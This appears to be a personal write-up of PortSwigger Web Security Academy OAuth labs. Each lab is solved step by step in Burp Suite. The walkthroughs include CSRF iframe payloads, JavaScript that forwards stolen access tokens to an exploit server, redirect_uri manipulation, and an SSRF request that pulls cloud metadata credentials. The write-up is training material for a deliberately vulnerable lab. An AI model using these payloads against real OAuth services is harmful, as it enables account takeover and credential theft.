# Portswigger
## OAuth Authentication
### Authentication bypass via OAuth implicit flow
```bash

# This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

# To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.

# You can log in with your own social media account using the following credentials: wiener:peter. 

Click "My account"
Input uname/pword

wiener:peter

Go to: HTTP history
Find:

POST /authenticate HTTP/1.1

{"email":"wiener@hotdog.com",
"username":"wiener",
"token":"vO4Gm4EKyVkOYb9lmh-cVnQUFxEQwOxKFVap38g5V-8"}

Logout
Intercept is on
Click "My account"
Change:

POST /authenticate HTTP/1.1

{"email":"carlos@carlos-montoya.net",
"username":"carlos",
"token":"vO4Gm4EKyVkOYb9lmh-cVnQUFxEQwOxKFVap38g5V-8"}

Send

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610223837.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610224036.png)

### Forced OAuth profile linking
```bash

#  This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

# To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

# The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

# You can log in to your own accounts using the following credentials:

    # Blog website account: wiener:peter
    # Social media profile: peter.wiener:hotdog

Login as wiener:peter
Click "Attach a social profile"
Login as peter.wiener:hotdog
Go to: HTTP history
Find:

GET /auth/3pGJ1JE69cKmZ61qoIpqS HTTP/1.1

Cookie: _interaction_resume=3pGJ1JE69cKmZ61qoIpqS; _session=NB0EFoeRmlkBcwXEYfK-D; _session.legacy=NB0EFoeRmlkBcwXEYfK-D

No 'state' parameter
Go to:

https://ac671f391e9a7f35c07e8f3c00e200cf.web-security-academy.net/my-account?id=wiener

Intercept is on
Click "Attach a social profile"
Forward once (or until)
Find:

GET /oauth-linking?code=Y6Buw0_6mQ5rjZZapyrFe7AGJ7qamX6LiOfzA8H2ZSj HTTP/1.1

Right-click the request -> Copy URL
Drop request
Intercept is off
Hit "Go back one page"
Go to: "Go to exploit server"

Body:

<iframe src="https://ac671f391e9a7f35c07e8f3c00e200cf.web-security-academy.net/oauth-linking?code=k8H2H4Bsf-idQ_mw20DPQ7sG6XJwWYkHU2udYU8pA2l"></iframe>

Store
Deliver exploit to victim
Go to:

https://ac671f391e9a7f35c07e8f3c00e200cf.web-security-academy.net/my-account?id=wiener

Logout
Click "My account"
Click "Login with social media"
Go to: "Admin panel"
Delete username "carlos"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610230005.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610230235.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610230202.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610231616.png)

### OAuth account hijacking via redirect_uri
```bash

# This lab uses an [OAuth](https://portswigger.net/web-security/oauth) service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

# To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

# The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

# You can log in with your own social media account using the following credentials: `wiener:peter`.


Go to: "My account"
Upon redirection login:

wiener:peter

Logout
Go to: "My account"
Click "Continue"
Go to: HTTP history
Find:

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://ac621ff31f1feb34c0930504008e00fe.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

Send to repeater

Change:

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://ac621ff31f1feb34c0930504008e00fe.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

To

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://test123.com/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

Response:

HTTP/1.1 302 Found

Redirecting to <a href="https://test123.com/oauth-callback?code=3NCfgBLpNRTy0PAyKUE2z46w2LRGlbQqNpecOX8z0Lw">

Go to: "Go to exploit server"

Change:

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://test123.com/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

To

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://exploit-ac8d1f0e1fb2eb19c04c052801460027.web-security-academy.net/exploit/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

Go to: HTTP history
Find:

GET /auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://ac621ff31f1feb34c0930504008e00fe.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

Right-click response -> Copy URL
Go to: "Go to exploit server"
Body:

https://oauth-acc81f581fc8ebdfc00a05f2024100ad.web-security-academy.net/auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://exploit-ac8d1f0e1fb2eb19c04c052801460027.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email

To

<iframe src='https://oauth-acc81f581fc8ebdfc00a05f2024100ad.web-security-academy.net/auth?client_id=jy9hhtqudaod0tcrrziu6&redirect_uri=https://exploit-ac8d1f0e1fb2eb19c04c052801460027.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email'></iframe>

Store
Deliver exploit to victim
Go to: "Access log"
Find:

/oauth-callback?code=lfC5ruiCFQwiUvrgHTdmbxwBW3wCbPuFGK9Bx1LG0GL

Copy:

lfC5ruiCFQwiUvrgHTdmbxwBW3wCbPuFGK9Bx1LG0GL

Go to:

https://ac621ff31f1feb34c0930504008e00fe.web-security-academy.net/

Go to: "My account"
Log out
Intercept is on
Go to: "My account"
Forward requests until:

GET /oauth-callback?code=YF9twM0tVtbjgCbE0xdRqlPSDgC26WEM00Us9jlYx8l HTTP/1.1

Change:

GET /oauth-callback?code=YF9twM0tVtbjgCbE0xdRqlPSDgC26WEM00Us9jlYx8l HTTP/1.1

To

GET /oauth-callback?code=lfC5ruiCFQwiUvrgHTdmbxwBW3wCbPuFGK9Bx1LG0GL HTTP/1.1

Go to: "Admin panel"
Delete the username "carlos"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010349.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010520.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010544.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010703.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611011230.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010741.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611010242.png)

### Stealing OAuth access tokens via an open redirect
```bash

# This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

# To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner. 

# You cannot access the admin's API key by simply logging in to their account on the client application. 

# The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

# You can log in via your own social media account using the following credentials: wiener:peter. 

Go to: "My account"
Once redirected login as:

wiener:peter

Go to: HTTP history
Find:

GET /me HTTP/1.1

Send to repeater (for later)
Re-log
Go to: HTTP history
Find:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback&

Send to repeater

Change:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback&response_type=token&nonce=-1481991640&scope=openid%20profile%20email HTTP/1.1

To

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback/../&response_type=token&nonce=-1481991640&scope=openid%20profile%20email HTTP/1.1

Response:

HTTP/1.1 302 Found

Intercept is on
Re-log
Forward until:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback&response_type=token&nonce=1198421054&scope=openid%20profile%20email HTTP/1.1

Change to:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback/../post?postId=5&response_type=token&nonce=1198421054&scope=openid%20profile%20email HTTP/1.1

Response:

https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/post?postId=5#access_token=T-wLruDR718cIua_I252b_SXqnJja8oeQd3xfC9zvNi&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email

Intercept is on
Scroll to bottom
Click "Next post"
Find:

GET /post/next?path=/post?postId=6 HTTP/1.1

Send to repeater
Intercept is off
Go to: Repeater
Change:

GET /post/next?path=/post?postId=6 HTTP/1.1

To

GET /post/next?path=https://exploit-ac891f3e1e1a9a26c0525aa101190082.web-security-academy.net/exploit HTTP/1.1

Send
Right-click response -> Show response in browser -> Copy
Go to:

http://burpsuite/show/2/aaesx0c7dntm5y11s55f5qw1opu6ed2k

Response:

"Hello world!"

Intercept is on
Click "My account"
Find:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback&response_type=token&nonce=1387349322&scope=openid%20profile%20email HTTP/1.1

Change to:

GET /auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac891f3e1e1a9a26c0525aa101190082.web-security-academy.net/exploit&response_type=token&nonce=1387349322&scope=openid%20profile%20email HTTP/1.1

Response:

"Hello world!"

Go to: "Go to exploit server"
Body:

<script>
window.location = '/?'+document.location.hash.substr(1)
</script>

Store
Go to:

https://exploit-ac891f3e1e1a9a26c0525aa101190082.web-security-academy.net/exploit

Go to: "Go to exploit server"
Access log
Your access_token should be visible
Go to: "Go to exploit server"
Change:
Body:

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-ac9c1f1e1e659a34c03e5a2e02470006.web-security-academy.net/auth?client_id=myts2a6dlxi262p7ws0up&redirect_uri=https://ac441fcc1ef29a53c0c45aec00bd0048.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac891f3e1e1a9a26c0525aa101190082.web-security-academy.net/exploit/&response_type=token&nonce=1387349322&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

Store
Deliver exploit to victim
Access log
Find:

lgUirMedjsTACCZD0yDpmTGdUGfpqzkBNruKSnGcqpm

Go to: Repeater
Find:

GET /me HTTP/1.1

Replace:

Authorization: Bearer 8GYD2RyMqnNAWmlBUbRNXZ207g80nY8phibHFVNkP_cbeyy70ia9buov

With

Authorization: Bearer lgUirMedjsTACCZD0yDpmTGdUGfpqzkBNruKSnGcqpm

Send

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611232405.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611230128.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611231923.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611231509.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611233851.png)

### Stealing OAuth access tokens via a proxy page
```bash

# This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

# To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

# The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

# You can log in via your own social media account using the following credentials: wiener:peter. 

Go to: "My account"
Login as: 

wiener:peter

Re-log
Go to: HTTP history
Find:

GET /auth?client_id=bk91tnjnh5l2a8f6qbk27&redirect_uri=https://ac0a1fb51fea71bec022b90800bd007b.web-security-academy.net/oauth-callback/../&response_type=token&nonce=1615567977&scope=openid%20profile%20email HTTP/1.1

Send to repeater
Change to:

GET /auth?client_id=bk91tnjnh5l2a8f6qbk27&redirect_uri=rip/oauth-callback&response_type=token&nonce=1615567977&scope=openid%20profile%20email HTTP/1.1

Response:

HTTP/1.1 400 Bad Request

Change to:

GET /auth?client_id=bk91tnjnh5l2a8f6qbk27&redirect_uri=https://ac0a1fb51fea71bec022b90800bd007b.web-security-academy.net/oauth-callback/../&response_type=token&nonce=1615567977&scope=openid%20profile%20email HTTP/1.1

Response:

HTTP/1.1 302 Found

Go to:

https://ac0a1fb51fea71bec022b90800bd007b.web-security-academy.net/post?postId=6

View source
Find:

<iframe onload='this.height = this.contentWindow.document.body.scrollHeight + "px"' width=100% frameBorder=0 src='/post/comment/comment-form#postId=6'></iframe>

Go to: HTTP history
Find:

GET /post/comment/comment-form HTTP/1.1

Response:

<script>
	parent.postMessage({type: 'onload', data: window.location.href}, '*')
	function submitForm(form, ev) {
		ev.preventDefault();
		const formData = new FormData(document.getElementById("comment-form"));
		const hashParams = new URLSearchParams(window.location.hash.substr(1));
		const o = {};
		formData.forEach((v, k) => o[k] = v);
		hashParams.forEach((v, k) => o[k] = v);
		parent.postMessage({type: 'oncomment', content: o}, '*');
		form.reset();
	}
</script>

Find:

GET /auth?client_id=bk91tnjnh5l2a8f6qbk27&redirect_uri=https://ac0a1fb51fea71bec022b90800bd007b.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1615567977&scope=openid%20profile%20email 

Right-click request -> Copy URL

Go to: "Go to exploit server"
Insert copied request into an iframe tag and append "/../post/comment/comment-form" to the "redirect_uri" + addEventListener
Body:

<iframe src="https://oauth-ac4c1ff01f667116c06ab91202d1004d.web-security-academy.net/auth?client_id=bk91tnjnh5l2a8f6qbk27&redirect_uri=https://ac0a1fb51fea71bec022b90800bd007b.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1615567977&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>

Store
Deliver exploit to victim
Access log
Find the new-found "access_token"

hKGp4mXZqI5Op-IIGzW6o9HRd27T0DlAIT7ae1GYU8G

Go to: HTTP history
Find:

GET /me HTTP/1.1

Change:

Authorization: Bearer huK6JqRuiHVxS066EJw27xNPitJJAQa5_xmT2QGOMC6beyy70iaf9zfb

To

Authorization: Bearer hKGp4mXZqI5Op-IIGzW6o9HRd27T0DlAIT7ae1GYU8G

Send

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611235745.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611235829.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612000005.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611235602.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611233646.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612000107.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220611233924.png)

### SSRF via OpenID dynamic client registration
```bash

# This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

# To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

# You can log in to your own account using the following credentials: wiener:peter

Go to: "My account"
Login as:

wiener:peter

Go to: HTTP history
Find:

GET /auth/KzWxMVtB6neBqDgq0fCfD HTTP/1.1

Copy:

oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net

Open a new tab in browser
Go to:

https://oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net/.well-known/openid-configuration

Ctrl+f

"registration_endpoint"

Find:

"registration_endpoint":"https://oauth-ac841f571f356c45c00802df02ce00e2.web-security-academy.net/reg"

Go to: Repeater
Add:

POST /reg HTTP/1.1
Host: oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net
Content-Type: application/json
Content-Length: 49

{
"redirect_uris": [
  "https://test.com"
]
}

Response:

HTTP/1.1 201 Created

Go to: HTTP history
Find:

GET /client/wlx1vcpjkusmdyc4iz67a/logo HTTP/1.1

Send to repeater

Go to Burp -> Burp Collaborator client -> Copy to clipboard
Go to: Repeater
Find:

POST /reg HTTP/1.1

Change:

POST /reg HTTP/1.1
Host: oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net
Content-Type: application/json
Content-Length: 49

{
"redirect_uris": [
  "https://test.com"
]
}

To

POST /reg HTTP/1.1
Host: oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net
Content-Type: application/json
Content-Length: 115

{
"redirect_uris": [
  "https://test.com"
],
"logo_uri":"https://68cpbgmuwryzmyy7e56mbeqzkqqge5.oastify.com"
}

Response:

"client_id":"tAW4exlC5JSzaYlGz5yFJ"

Copy the client_id value
Go to: Repeater
Find:

GET /client/wlx1vcpjkusmdyc4iz67a/logo HTTP/1.1

Change:

GET /client/wlx1vcpjkusmdyc4iz67a/logo HTTP/1.1

To

GET /client/tAW4exlC5JSzaYlGz5yFJ/logo HTTP/1.1

Send
Go to Burp Collaborator client -> Poll now
Find:
Type: HTTP
Go to: Response from Collaborator
Response:

HTTP/1.1 200 OK

Go to: Repeater
Find:

POST /reg HTTP/1.

Change:

POST /reg HTTP/1.1
Host: oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net
Content-Type: application/json
Content-Length: 115

{
"redirect_uris": [
  "https://test.com"
],
"logo_uri":"https://68cpbgmuwryzmyy7e56mbeqzkqqge5.oastify.com"
}

To

POST /reg HTTP/1.1
Host: oauth-ac511f431ea14217c03a073102a300e6.web-security-academy.net
Content-Type: application/json
Content-Length: 139

{
"redirect_uris": [
  "https://test.com"
],
"logo_uri":   "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

Send
Response:

"client_id":"DejrR-ROWR6zEdMAEIRUa"

Copy the client_id value
Go to: Repeater
Find:

GET /client/tAW4exlC5JSzaYlGz5yFJ/logo HTTP/1.1

Change:

GET /client/DejrR-ROWR6zEdMAEIRUa/logo HTTP/1.1

Send
Response:

"SecretAccessKey" : "ABDXpijS4fIkUUN4A3zBzYFDkF9yJxEjuXM17rk2"

```



![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013147.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013207.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013117.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013318.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013512.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013644.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013805.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612013950.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220612014103.png)

#hacking
